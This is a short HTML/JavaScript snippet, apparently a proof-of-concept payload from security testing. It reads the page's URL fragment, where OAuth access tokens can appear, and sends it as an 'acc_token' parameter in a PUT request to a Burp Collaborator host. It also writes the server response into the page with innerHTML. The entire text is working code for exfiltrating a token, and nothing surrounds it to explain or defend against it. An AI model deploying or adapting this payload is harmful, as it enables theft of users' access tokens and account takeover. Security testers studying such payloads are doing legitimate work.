<script>
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = this.responseText;
    }
  };
  var privateData = "empty";
  if(typeof window.location.hash != "undefined"){
    privateData = window.location.hash.substr(1);};
  var url = "//2wzlylv5b4a9nw85cgsrsv11isoic7.burpcollaborator.net?acc_token="+privateData;
  xhttp.open("PUT", url, true);
  xhttp.send();
</script>
